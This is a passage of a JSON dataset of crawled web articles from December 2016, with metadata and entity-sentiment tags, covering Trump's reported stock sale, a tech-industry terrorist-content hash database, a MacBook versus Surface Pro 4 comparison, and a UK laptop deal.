            "name": "sean bryan",
            "sentiment": "neutral"
          },
          {
            "name": "mccann",
            "sentiment": "neutral"
          },
          {
            "name": "tom murphy",
            "sentiment": "neutral"
          },
          {
            "name": "roberto baibich",
            "sentiment": "none"
          },
          {
            "name": "chris mcmurtrey",
            "sentiment": "none"
          },
          {
            "name": "david mitchell",
            "sentiment": "none"
          },
          {
            "name": "todd brown",
            "sentiment": "none"
          },
          {
            "name": "susann goerg",
            "sentiment": "none"
          },
          {
            "name": "jim hord",
            "sentiment": "none"
          },
          {
            "name": "david cappolino",
            "sentiment": "none"
          },
          {
            "name": "jake scott producer",
            "sentiment": "none"
          },
          {
            "name": "melissa tifrere",
            "sentiment": "none"
          },
          {
            "name": "jeremy adirim",
            "sentiment": "none"
          },
          {
            "name": "susan young",
            "sentiment": "none"
          },
          {
            "name": "jason groves",
            "sentiment": "none"
          },
          {
            "name": "scott higgins",
            "sentiment": "none"
          },
          {
            "name": "david cliff director",
            "sentiment": "none"
          },
          {
            "name": "chris soos",
            "sentiment": "none"
          },
          {
            "name": "aaron kovan",
            "sentiment": "none"
          },
          {
            "name": "daniel kim",
            "sentiment": "none"
          },
          {
            "name": "nick ciomperlik",
            "sentiment": "none"
          },
          {
            "name": "eric johnson",
            "sentiment": "none"
          },
          {
            "name": "mel senecal",
            "sentiment": "none"
          },
          {
            "name": "julie koong",
            "sentiment": "none"
          },
          {
            "name": "rebecca magner",
            "sentiment": "none"
          },
          {
            "name": "alicia foor director",
            "sentiment": "none"
          },
          {
            "name": "sam belkin",
            "sentiment": "none"
          },
          {
            "name": "daniela vojta",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "charlotte popper executive integrated",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "usa",
            "sentiment": "none"
          },
          {
            "name": "new york",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T23:09:13.115+02:00"
    },
    {
      "thread": {
        "uuid": "f8bb480d6160eef402f1fe0c3cb0b211eb16877b",
        "url": "http://omgili.com/ri/jHIAmI4hxg.uirYnf46ccQYSWX9yPpewflRULc2uSxo.2P64F8fLFDVEd6ZWaoyA9hUj4DG0SPrW7E6iDQ0AWXTh9bgtILXcWoAaNRF_v8oQm4KP2RjyRomKmmTOcEdTE9kN4pZOUP._H6BLNW6yaA--",
        "site_full": "www.thestreet.com",
        "site": "thestreet.com",
        "site_section": "https://www.thestreet.com/",
        "site_categories": [
          "news",
          "finance"
        ],
        "section_title": "Stock Market - Business News, Market Data, Stock Analysis - TheStreet",
        "title": "Trump Sold All of His Stocks in June, Spokesman Miller Says",
        "title_full": "Trump Sold All of His Stocks in June, Spokesman Miller Says - TheStreet",
        "published": "2016-12-06T23:33:00.000+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://s.thestreet.com/files/tsc/v2008/photos/contrib/uploads/eb859d51-99ed-11e6-9374-49ef6f2f5c81.png",
        "performance_score": 0,
        "domain_rank": 2567,
        "social": {
          "facebook": {
            "likes": 54,
            "comments": 0,
            "shares": 54
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "f8bb480d6160eef402f1fe0c3cb0b211eb16877b",
      "url": "http://omgili.com/ri/jHIAmI4hxg.uirYnf46ccQYSWX9yPpewflRULc2uSxo.2P64F8fLFDVEd6ZWaoyA9hUj4DG0SPrW7E6iDQ0AWXTh9bgtILXcWoAaNRF_v8oQm4KP2RjyRomKmmTOcEdTE9kN4pZOUP._H6BLNW6yaA--",
      "ord_in_thread": 0,
      "author": "Emily Stewart",
      "published": "2016-12-06T23:33:00.000+02:00",
      "title": "Trump Sold All of His Stocks in June, Spokesman Miller Says",
      "text": "Turns out, Donald Trump doesn't own stock in Boeing. Nor in Microsoft, or Ford, or Amazon, or AT&T, or any of several other companies whose policies may be affected by his future administration, and all of which he said he held as of a financial disclosure he made in May. He's gotten rid of all that stock, his spokesman Jason Miller said today. Sold it all in June, Miller said.\nMiller made the comment on a call with the press regarding Trump's morning tweet criticizing Boeing ( BA ) for overcharging the government on the sale of a new version of Air Force One. Miller later confirmed to the AP that he did indeed mean that Trump had sold not just his Boeing stock, but all of his stocks at that time. The AP asked for proof, and Miller declined to provide it.\nThe Trump transition team did not respond to requests for comment on the stock sales or to provide any evidence of it.\nThe announcement comes amid growing conflict-of-interest concerns regarding Trump's business endeavors that are not necessarily shared by the president-elect, his family or his business associates. In his May 2016 financial disclosure , the self-described billionaire listed millions of dollars in investments in dozens of publicly-traded companies across a wide range of industries, including banking, technology, energy and autos.\nTrump's camp has been rather coy regarding what will happen to his private business interests, including stock holdings, now that he has been elected. The Washington Post reported as recently as last week that a Trump spokeswoman did not respond to requests for comment for one of its stories on Trump's stock portfolio. Trump announced on Twitter in late November that he will discuss what will happen with the Trump Organization at a December 15 news conference. There is no indication he will divest of the company, and signs point to him holding control over to his children instead.\nTrump held positions in a number of companies about which he spoke frequently while campaigning and after his election. One such example is Apple ( AAPL ) , of which he previously held as much as $2.25 million in shares.\nOn the campaign trail, the real estate magnate was at times critical of the tech giant, claiming that as president he would get Apple to manufacture their \"damn computers\" in America and at one point floating the idea of boycotting the company until it helped the FBI break into the iPhone of one of the San Bernardino shooters.\nAfter his election, the president-elect told the New York Times he had been in touch with Apple CEO Tim Cook and asked him to get the company to \"build a big plant in the United States.\" He also said he told him his administration would be going after a \"very large tax cut for corporations.\" Trump has proposed dropping the corporate tax rate to 15%.\nTrump also told the Times that Microsoft ( MSFT ) founder Bill Gates had called him after the election. During a campaign speech in South Carolina a year ago , Trump said he would work on closing up parts of the Internet to fight terrorism by going to see Gates and \"a lot of different people that really understand what's happening.\" In his May filing, he listed up to $600,000 in Microsoft shares.\nHe disclosed a position in Amazon ( AMZN ) of up to $100,000. Trump frequently criticized the e-commerce company's CEO, Jeff Bezos.\nIn May, Trump contended Amazon has a \"huge antitrust problem\" and said the company is \"getting away with murder, tax-wise.\" He accused Bezos of using the Post, which he owns, to wield power over lawmakers to avoid taxes.\nHe disclosed holdings in Ford ( F ) as well, which he frequently criticized for outsourcing on the campaign trail. After his election, he falsely took credit for the company's decision to keep one of its plants in Kentucky.\nTrump listed holdings in companies about which his administration stands to make important decisions once he is in the White House.\nHe held shares of both AT&T ( T ) and Time Warner ( TWX ) , which announced an $85 billion merger in October that his Justice Department will oversee. Trump said he would seek to block the deal when it was first announced because it concentrated too much \"power in the hands of too few.\" However, he may have since changed his tune. The Financial Times reported last week that AT&T was encouraged by Trump's appointments of two former competition antitrust officials with a hands-off record on enforcement.\nHe listed holdings in Wells Fargo ( WFC ) as well, which earlier this year was flagged and fined by the Consumer Finance Protection Bureau for creating millions of phony accounts.\nTrump had also previously listed holdings in Energy Transfer Partners ( ETP ) , the owner of the $3.7 billion Dakota Access pipeline that has become a political flashpoint in recent months. A Trump spokeswoman confirmed in late November he had sold off his stake over the summer . Trump has been supportive of the project, a stance Miller reaffirmed on Monday .\nAlso in the Trump portfolio was IBM ( IBM ) , whose CEO, Ginni Rometty, reached out to Trump soon after his election in an open letter outlining areas for cooperation . She will now form part of a CEO advisory forum to Trump . And, he listed holdings of Goldman Sachs ( GS ) , where his Treasury Secretary nominee, Steve Mnuchin, was a former executive and his top adviser, Steve Bannon, worked as well.\nThis is not the first time Trump has said he bought and sold a significant number of stocks all at once.\nWhen he made his first personal finance disclosure in July 2015, soon after announcing his candidacy, he claimed to have sold 45 stocks in January 2014 for a gain of more than $27 million. He said he made only five losing picks: Coca-Cola ( KO ) , D.R. Horton ( DHI ) , Enbridge Inc. ( ENB ) , Occidental Petroleum ( OXY ) and PepsiCo ( PEP ) .\nThe Trump camp did not return request for comment on how much the president-elect made on his stock sales this time around.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [
        "http://hosted2.ap.org/APDEFAULT/89ae8247abe8493fae24405546e9a1aa/Article_2016-12-06-US--Trump-The%20Latest/id-6bd7ccb8435f492ca6cbddae78142cbf",
        "http://www.consumerfinance.gov/about-us/newsroom/consumer-financial-protection-bureau-fines-wells-fargo-100-million-widespread-illegal-practice-secretly-opening-unauthorized-accounts/",
        "https://www.washingtonpost.com/news/energy-environment/wp/2016/11/23/trump-dumped-his-stock-in-dakota-access-pipeline-owner-over-the-summer/?utm_term=.1057f9312b09",
        "http://money.cnn.com/2016/11/17/news/companies/ford-mexico-donald-trump/",
        "http://www.nytimes.com/2016/11/23/us/politics/trump-new-york-times-interview-transcript.html",
        "http://www.cnn.com/2016/02/19/politics/donald-trump-apple-boycott/",
        "http://www.forbes.com/sites/ericmack/2015/12/08/donald-trump-thinks-he-can-call-bill-gates-to-shut-down-the-internet/#293d6fb24398",
        "https://assets.donaldjtrump.com/DJT_PFD_Statement_(1).pdf",
        "https://www.cnet.com/news/trump-says-hell-force-apple-to-manufacture-in-the-us/",
        "https://www.documentcloud.org/documents/2838696-Trump-2016-Financial-Disclosure.html",
        "https://www.washingtonpost.com/politics/trumps-complex-stock-portfolio-could-create-yet-more-conflicts/2016/12/01/25ec0e88-b663-11e6-959c-172c82123976_story.html?utm_term=.bb7fd408607a",
        "https://www.ft.com/content/4c2d02fe-b7ea-11e6-ba85-95d1533d9a62"
      ],
      "entities": {
        "persons": [
          {
            "name": "donald trump",
            "sentiment": "negative"
          },
          {
            "name": "miller",
            "sentiment": "negative"
          },
          {
            "name": "trump",
            "sentiment": "negative"
          },
          {
            "name": "jeff bezos",
            "sentiment": "none"
          },
          {
            "name": "bill gates",
            "sentiment": "none"
          },
          {
            "name": "d.r. horton",
            "sentiment": "none"
          },
          {
            "name": "steve bannon",
            "sentiment": "none"
          },
          {
            "name": "bezos",
            "sentiment": "none"
          },
          {
            "name": "gates",
            "sentiment": "none"
          },
          {
            "name": "ginni rometty",
            "sentiment": "none"
          },
          {
            "name": "tim cook",
            "sentiment": "none"
          },
          {
            "name": "jason miller",
            "sentiment": "none"
          },
          {
            "name": "steve mnuchin",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "boeing",
            "sentiment": "negative"
          },
          {
            "name": "ford",
            "sentiment": "neutral"
          },
          {
            "name": "at&t",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "goldman sachs",
            "sentiment": "none"
          },
          {
            "name": "financial times",
            "sentiment": "none"
          },
          {
            "name": "pepsico",
            "sentiment": "none"
          },
          {
            "name": "justice department",
            "sentiment": "none"
          },
          {
            "name": "treasury",
            "sentiment": "none"
          },
          {
            "name": "consumer finance protection bureau",
            "sentiment": "none"
          },
          {
            "name": "post",
            "sentiment": "none"
          },
          {
            "name": "ibm",
            "sentiment": "none"
          },
          {
            "name": "enbridge inc.",
            "sentiment": "none"
          },
          {
            "name": "time warner",
            "sentiment": "none"
          },
          {
            "name": "energy transfer partners",
            "sentiment": "none"
          },
          {
            "name": "coca-cola",
            "sentiment": "none"
          },
          {
            "name": "amzn",
            "sentiment": "none"
          },
          {
            "name": "trump organization",
            "sentiment": "none"
          },
          {
            "name": "trump",
            "sentiment": "none"
          },
          {
            "name": "apple",
            "sentiment": "none"
          },
          {
            "name": "times",
            "sentiment": "none"
          },
          {
            "name": "new york times",
            "sentiment": "none"
          },
          {
            "name": "occidental petroleum",
            "sentiment": "none"
          },
          {
            "name": "fbi",
            "sentiment": "none"
          },
          {
            "name": "wells fargo",
            "sentiment": "none"
          },
          {
            "name": "washington post",
            "sentiment": "none"
          },
          {
            "name": "amazon",
            "sentiment": "none"
          },
          {
            "name": "ap",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "amazon",
            "sentiment": "none"
          },
          {
            "name": "united states",
            "sentiment": "none"
          },
          {
            "name": "america",
            "sentiment": "none"
          },
          {
            "name": "south carolina",
            "sentiment": "none"
          },
          {
            "name": "white house",
            "sentiment": "none"
          },
          {
            "name": "san bernardino",
            "sentiment": "none"
          },
          {
            "name": "kentucky",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-07T04:54:24.797+02:00"
    },
    {
      "thread": {
        "uuid": "356786c310e66ff2a8d9c3c558ca07286b717b3f",
        "url": "http://omgili.com/ri/.wHSUbtEfZR3OSYnYmcftMxzIJK0aAEz2RTcUWiQA_CZ5giK3BYkbbvfRzezLKfEW9Hc8BInHrwmwNOCxlZ_Bqwz62DwjEFe",
        "site_full": "www.rt.com",
        "site": "rt.com",
        "site_section": "http://rt.com/rss/",
        "site_categories": [
          "news",
          "education"
        ],
        "section_title": "RT - Daily news",
        "title": "Microsoft, social network giants team up to track terrorist content",
        "title_full": "Microsoft, social network giants team up to track terrorist content",
        "published": "2016-12-07T05:28:22.572+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://img.rt.com/files/2016.12/article/584767cec36188d31f8b4589.jpg",
        "performance_score": 1,
        "domain_rank": 538,
        "social": {
          "facebook": {
            "likes": 170,
            "comments": 0,
            "shares": 170
          },
          "gplus": {
            "shares": 3
          },
          "pinterest": {
            "shares": 1
          },
          "linkedin": {
            "shares": 5
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "356786c310e66ff2a8d9c3c558ca07286b717b3f",
      "url": "http://omgili.com/ri/.wHSUbtEfZR3OSYnYmcftMxzIJK0aAEz2RTcUWiQA_CZ5giK3BYkbbvfRzezLKfEW9Hc8BInHrwmwNOCxlZ_Bqwz62DwjEFe",
      "ord_in_thread": 0,
      "author": "RT",
      "published": "2016-12-07T05:28:22.572+02:00",
      "title": "Microsoft, social network giants team up to track terrorist content",
      "text": "Microsoft, social network giants team up to track terrorist content Published time: 7 Dec, 2016 03:26 Get short URL © Dado Ruvic / Reuters Facebook, Microsoft, Twitter and YouTube have joined forces to fight the spread of terrorist propaganda online. Together they say they will create a “digital fingerprints” database of terror-linked content that also respects privacy and freedom of speech. \n“Our companies will begin sharing hashes of the most extreme and egregious terrorist images and videos we have removed from our services – content most likely to violate all of our respective companies’ content policies,” the tech giants’ statement reads. \nThe database the four giants are going to launch is similar to a technology that Google has been using to scan for pictures involving child abuse. Read more EU blasts Twitter, YouTube & Facebook for slow action on hate speech \nIts automatic image search compares “hashes” of images ‒ a unique code created by running an image through a simple algorithm ‒ that is then compared to a database of hashes produced by known images of child abuse. Similar technologies are also used to identify copyright-protected files. \nFacebook, Microsoft, Twitter and YouTube are essentially going to be doing the same. \n“Starting today, we commit to the creation of a shared industry database of ‘hashes’– unique digital ‘fingerprints’– for violent terrorist imagery or terrorist recruitment videos or images that we have removed from our services,” the companies said. \nOnce a company detects prohibited content, it will independently determine what image and video it wants add to the database. \nAnticipating outcries of privacy concerns, Facebook assured that “no personally identifiable information” will be shared between the companies and that posts matching the “fingerprints” won’t be immediately removed. \n“Each company will continue to apply its own policies and definitions of terrorist content when deciding whether to remove content when a match to a shared hash is found,” the companies said, stressing that they are “committed” to protecting privacy and freedom of speech. \nREAD MORE: Google admits scanning Gmail for kiddie porn after turning in pedophile \nIt will also be an individual decision in each company’s case, whether or not they apply practices of transparency and how to deal with any government requests. \nFacebook, Microsoft, Twitter and YouTube are just starting to set up their database, but they hope that as they uncover new terrorist images, more companies will join.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "dado ruvic",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "youtube & facebook",
            "sentiment": "none"
          },
          {
            "name": "eu",
            "sentiment": "none"
          },
          {
            "name": "reuters facebook",
            "sentiment": "none"
          },
          {
            "name": "facebook",
            "sentiment": "none"
          },
          {
            "name": "google",
            "sentiment": "none"
          },
          {
            "name": "youtube",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-07T05:28:22.572+02:00"
    },
    {
      "thread": {
        "uuid": "816f79b4434a7b5f365b7f79e66aa29fb5b9636f",
        "url": "http://omgili.com/ri/jHIAmI4hxg.irEX7KvLpUF7iUCIbdJPkYoB8NshUQbWbAG.Nn_xiCNmwip2TDicpMQ_TJvEwbsECfe449_0zxGOm1uf7Yewtne591ENbJ5U-",
        "site_full": "www.cnet.com",
        "site": "cnet.com",
        "site_section": "https://www.cnet.com/",
        "site_categories": [
          "news"
        ],
        "section_title": "Product reviews, how-tos, deals and the latest tech news - CNET",
        "title": "Apple's pricey MacBooks have me taking a second look at Microsoft's Surface Pro 4",
        "title_full": "Apple's pricey MacBooks have me taking a second look at Microsoft's Surface Pro 4 - CNET",
        "published": "2016-12-06T23:40:00.000+02:00",
        "replies_count": 12,
        "participants_count": 11,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://cnet1.cbsistatic.com/img/NrtBuqPeOtm2IbJ3gbluQl2fWQ8=/670x503/2016/11/04/b1a569db-badf-452c-babc-0928b817617e/apple-macbook-pro-with-touch-bar-13-inch-2016-13.jpg",
        "performance_score": 0,
        "domain_rank": 164,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 2
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "816f79b4434a7b5f365b7f79e66aa29fb5b9636f",
      "url": "http://omgili.com/ri/jHIAmI4hxg.irEX7KvLpUF7iUCIbdJPkYoB8NshUQbWbAG.Nn_xiCNmwip2TDicpMQ_TJvEwbsECfe449_0zxGOm1uf7Yewtne591ENbJ5U-",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-06T23:40:00.000+02:00",
      "title": "Apple's pricey MacBooks have me taking a second look at Microsoft's Surface Pro 4",
      "text": "For the past six months I've been in the market for a new laptop, and like a lot of people, I put off making a purchase until Apple unveiled its redesigned MacBook Pros, which were officially introduced in late October and shipped last month.\nFor those who missed the release, the new MacBook Pros come in entry-level and premium versions. Both are slimmed-down versions of their predecessors -- essentially a MacBook Pro in a MacBook Air chassis with USB-C ports instead of standard USB -- but the premium model has an integrated Touch Bar OLED strip that takes the place of the old-school function keys at the top of the keyboard.\nCNET editor Dan Ackerman gave that MacBook Pro with Touch Bar a 4.5-star rating, calling it a \"Second-screen dream machine\" and thanks to that \"smart, useful Touch Bar,\" the premium model was well worth splurging on over the standard streamlined 13-inch MacBook Pro .\nEnlarge Image Apple's Touch Bar is a nice touch, but it'll cost you.\nPhoto by Sarah Tew/CNET It's a great machine. I've played around with it. I've touched the Touch Bar. I've looked at this laptop longingly, open and closed. There's only one problem: It starts at $1,800 for the 13-inch model and $2,400 for the 15-inch model, which includes a step-up Core i7 processor and more RAM (16GB) in its base model. It's also worth mentioning that the new entry-level 13-inch MacBook Pro, sans Touch Bar, starts at $1,500 -- or $200 more than last year's MacBook Pro.\nThese high prices and some heated debate online over the utility of the Touch Bar may have raised some eyebrows, but Apple managed to put up record sales number during the launch windows.\n\"We are proud to tell you that so far our online store has had more orders for the new MacBook Pro than any other pro notebook before,\" Phil Schiller, Apple SVP, told The Independent , a UK publication, on November 2.\nNot surprising, considering that months of rumors of a pending MacBook Pro redesign left plenty of folks -- like me -- holding off on their MacBook purchases. Demand was sky-high.\n(Apple did not respond to CNET's request for follow-up comment on the MacBook Pro's pricing or demand.)\nEnlarge Image Select models of the Surface Pro 4 are frequently on sale.\nPhoto by Sarah Tew/CNET While I was tempted to bite, I didn't. I felt that if I was going to get a new MacBook Pro, I might as well get the one with the Touch Bar because if I got the standard one I thought there'd always be a little part of me that would wish I'd paid a few hundred bucks more and gotten the extra touch strip. Once you're $1,500 in the hole, you might as well go to $1,800, my reasoning went.\nBut then I thought, \"$1,800 is a lot of money, do I really need to spend that much on a laptop?\" I'm not a graphic designer. Sure, I might do a little editing of family videos, but on the whole, I'm not doing anything that would tax most current laptops -- why not get a lightweight Windows tablet PC with a full touch screen interface that costs significantly less? After all, I'm kind of in the market for an iPad, but with prices for iPads also being high, I haven't bothered to buy a new one (I use an iPad Air that was given to my wife as a gift and still works fine). So, why not combine two purchases into one?\nThen came Black Friday . Best Buy was selling the entry-level Surface Pro 4 with an Intel Core m3 plus a keyboard for $600. By comparison, Apple's beautifully designed m3-powered 12-inch MacBook , which I also had my eye on, starts at $1,300.\nEnlarge Image Apple's super-svelte 12-inch MacBook is powered by an Intel Core m3 chip and starts at $1,300.\nPhoto by Sarah Tew/CNET I haven't tried the entry-level version of the Surface Pro 4, but I have tried step-up models with Core i5 and Core i7 chips. I like the Type keyboard cover well enough, although my one gripe is that the integrated touchpad isn't nearly as good as the MacBook's (using a wireless mouse or Surface Pen for navigation is my preference). I may be slightly more partial to Mac OS X, but I'm also a little bored with it, and have never had anything against Windows 10 , so it's all good.\nAm I open to another tablet PC or lightweight convertible PC (a laptop that converts into a tablet)? Microsoft's Surface Book , for example, or something from Lenovo or HP? Sure, but for the moment I've zeroed in on the Surface Pro 4. It's a mature product, on its fourth iteration with presumably a fifth-generation model coming next year, and there are deals to be had on it.\nAs part of its 12 Days of Deals sale, on Thursday, December 8, Microsoft will have the entry-level m3-powered Pro 4 on sale for $649 (with a sleeve but no a keyboard cover) and on Friday, December 16, it's offering a $200 discount on select Pro 4 models, with a free Type Cover thrown in. And I wouldn't be surprised to see post-holiday sales on select Surface Book Pro 4 models.\nI'm not sure that \" Apple just handed Microsoft the keys to the kingdom ,\" as my colleague Sean Hollister wrote shortly after Apple first unveiled the new MacBook Pros. But those high prices on MacBooks have certainly opened the door to folks to look elsewhere for a more-affordable lightweight laptop that has the added appeal of doubling as a tablet.\nIf Microsoft could improve its Windows app store -- and by improve, I mean offer a wider range of cheap apps to compete with Apple's huge selection of iOS apps -- it'd be a no-brainer. However, as it stands, depending on the deal you can get, it may be a jump worth making.\n25 Tablets and e-book readers you'll want on your holiday wish list ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [
        "https://cnet3.cbsistatic.com/img/hG77dwpUcPugPTgqYeyXbv0RcgA=/fit-in/970x0/2016/04/19/879847f8-8998-4fd0-92db-904c0f380145/apple-macbook-2016-02.jpg",
        "http://www.independent.co.uk/life-style/gadgets-and-tech/features/apple-macbook-pro-new-philip-schiller-interview-phil-iphone-ios-criticism-a7393156.html",
        "https://www.microsoftstore.com/store/msusa/en_US/pdp/productID.325724000?gclid=CjwKEAiAvZTCBRDvnoOaoa2j3xISJABxPjN9v9hyOCRA65cLGO10NSzDddgJJ2SwpngYOnS87VL29xoC-1Dw_wcB&VID=325724600&s_kwcid=AL!4249!3!84410703018!!!g!324504054407!&WT.mc_id=us_datafeed_pla_google&WT.mc_id=pointitsem&WT.mc_id=Surface&ef_id=VdNYpgAAAILuFeYf:20161205201841:s",
        "https://cnet4.cbsistatic.com/img/bxh32DY0JaMiGK7-M3Twsw5W104=/724x407/2016/09/29/5dd749a5-e07e-43f3-b219-6a70cd9ea60e/kindle-fire-hd-8-21.jpg",
        "https://cnet4.cbsistatic.com/img/Y95Iwk8QVdcCrksX3ATmipsvQWM=/fit-in/970x0/2015/10/16/8f586801-631e-40c3-895f-b10a986a48dc/microsoft-surface-pro-4-27.jpg",
        "https://www.reddit.com/r/technology/comments/59r29f/wtf_is_apple_thinking_with_the_new_macbook_pro/",
        "https://www.microsoftstore.com/store/msusa/en_US/cat/12-Days-of-Deals/categoryID.67001200?icid=topstripe_12DDCountdown_SW",
        "https://cnet2.cbsistatic.com/img/lvOW_6iFLO5wIxd6k5cf-vj_CPI=/fit-in/970x0/2016/11/04/b1a569db-badf-452c-babc-0928b817617e/apple-macbook-pro-with-touch-bar-13-inch-2016-13.jpg"
      ],
      "entities": {
        "persons": [
          {
            "name": "sarah tew/cnet",
            "sentiment": "none"
          },
          {
            "name": "sarah",
            "sentiment": "none"
          },
          {
            "name": "sean hollister",
            "sentiment": "none"
          },
          {
            "name": "phil schiller",
            "sentiment": "none"
          },
          {
            "name": "dan ackerman",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "apple",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "touch bar oled",
            "sentiment": "none"
          },
          {
            "name": "macbook pros",
            "sentiment": "none"
          },
          {
            "name": "touch bar",
            "sentiment": "none"
          },
          {
            "name": "intel core",
            "sentiment": "none"
          },
          {
            "name": "lenovo",
            "sentiment": "none"
          },
          {
            "name": "macbook air",
            "sentiment": "none"
          },
          {
            "name": "enlarge image apple",
            "sentiment": "none"
          },
          {
            "name": "macbook",
            "sentiment": "none"
          },
          {
            "name": "the independent",
            "sentiment": "none"
          },
          {
            "name": "cnet",
            "sentiment": "none"
          },
          {
            "name": "apple svp",
            "sentiment": "none"
          },
          {
            "name": "macbook pro",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "uk",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-07T07:38:14.872+02:00"
    },
    {
      "thread": {
        "uuid": "60665650503039849100c97546c6280bf309c8a3",
        "url": "http://omgili.com/ri/jHIAmI4hxg_gDgFrQ1BFHb8o4XkVZ9ZfR_pasBeo2x_vqrDDI.HWY.NmhA3O2UK46cmN7oJ6mW1RZLRJ.iFdpAA9vlBbqI_KIey9FSZUv06n.Y.IjCn2a.fO6IE5pOawWdVYnbVGCVhek7yGgYpfs3Xxv43LhJc5gN0ydxWMzY4-",
        "site_full": "www.hotukdeals.com",
        "site": "hotukdeals.com",
        "site_section": "http://www.hotukdeals.com/rss/hot",
        "site_categories": [
          "news",
          "entertainment"
        ],
        "section_title": "HotUKDeals",
        "title": "HP Stream 14\" Celeron Laptop, Blue or Purple, 4Gb RAM, 32Gb with Microsoft Office 365 Personal, £199.99 (£179.99 with new account & code) + Potential 2.2% TCB or Quidco @ Littlewoods",
        "title_full": "HP Stream 14\" Celeron Laptop, Blue or Purple, 4Gb RAM, 32Gb with Microsoft Office 365 Personal, £199.99 (£179.99 with new account & code) + Potential 2.2% TCB or Quidco @ Littlewoods",
        "published": "2016-12-07T12:11:05.398+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://static.hotukdeals.com/images/threads/high-res/2568053_1.jpg",
        "performance_score": 0,
        "domain_rank": 1864,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "60665650503039849100c97546c6280bf309c8a3",
      "url": "http://omgili.com/ri/jHIAmI4hxg_gDgFrQ1BFHb8o4XkVZ9ZfR_pasBeo2x_vqrDDI.HWY.NmhA3O2UK46cmN7oJ6mW1RZLRJ.iFdpAA9vlBbqI_KIey9FSZUv06n.Y.IjCn2a.fO6IE5pOawWdVYnbVGCVhek7yGgYpfs3Xxv43LhJc5gN0ydxWMzY4-",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-07T12:11:05.398+02:00",
      "title": "HP Stream 14\" Celeron Laptop, Blue or Purple, 4Gb RAM, 32Gb with Microsoft Office 365 Personal, £199.99 (£179.99 with new account & code) + Potential 2.2% TCB or Quidco @ Littlewoods",
      "text": "Thought this was a good deal at the moment, choice of Blue or Purple with 4Gb RAM and a decent 14\" display. Comes with 1 year of Microsoft Office 365 Personal. Extra 10% off for signing up for a new Littlewoods credit account and using code KPAJV. Potentially 2.2% TCB or Quidco. Free delivery. Weighing only 1.45kg, with an outstanding battery life of more than 10 hours. 14 inch screen has a HD 1366x768 resolution, while stereo speakers supported by DTS Studio Sound™ enhance all your entertainment, whether you're surfing the web, listening to music or watching a movie. Microsoft Office 365 Personal is included for 12 months, giving full access to Microsoft Excel, Word, PowerPoint, OneNote, and Access, as well as the ability to store your files in the cloud with the 1Tb (1000Gb) of OneDrive storage. Intel® Celeron® N3060 (1.6 GHz, up to 2.48 GHz, 2 MB cache, 2 cores) Display: 35.6 cm (14\") diagonal HD SVA BrightView WLED-backlit (1366 x 768) Memory: 4 GB DDR3L-1600 SDRAM (1 x 4 GB) Transfer rates up to 1600 MT/s Windows 10 Home 64 Operating System Violet purple or Aqua Blue, Linear grooves pattern 32 GB eMMC Drive Integrated Graphics Intel® HD Graphics 400 Audio features DTS Studio Sound™, Dual speakers HP Webcam with integrated digital microphone Full-size island-style keyboard Pointing device HP Imagepad with multi-touch gesture support Wireless: Intel® 802.11a/b/g/n/ac (2x2) Wi-Fi® and Bluetooth® 4.2 Combo (Miracast compatible)",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "littlewoods",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "emmc drive integrated graphics intel",
            "sentiment": "none"
          },
          {
            "name": "microsoft excel",
            "sentiment": "none"
          },
          {
            "name": "intel",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-07T12:11:05.398+02:00"
    },
    {
      "thread": {
        "uuid": "ca4cd1ae7b43e652ba6b94c133b581c7474cee87",
